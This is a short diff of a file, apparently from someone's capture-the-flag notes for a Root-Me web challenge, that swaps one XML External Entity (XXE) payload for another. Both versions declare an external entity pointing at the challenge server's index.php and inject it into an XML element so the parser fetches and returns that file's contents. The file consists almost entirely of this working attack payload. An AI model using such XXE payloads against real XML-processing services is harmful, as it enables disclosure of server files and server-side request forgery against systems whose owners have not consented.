@@ -3,9 +3,9 @@ layout: null
 ---
 
 <?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE updateProfile [
- <!ENTITY % file SYSTEM "http://challenge01.root-me.org/web-serveur/ch29/index.php">
- <!ENTITY % start "<![CDATA[">
- <!ENTITY % end "]]>">
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "http://challenge01.root-me.org/web-serveur/ch29/index.php" >
 ]>
-<lastname>&file;</lastname>
+<foo>&xxe;</foo>
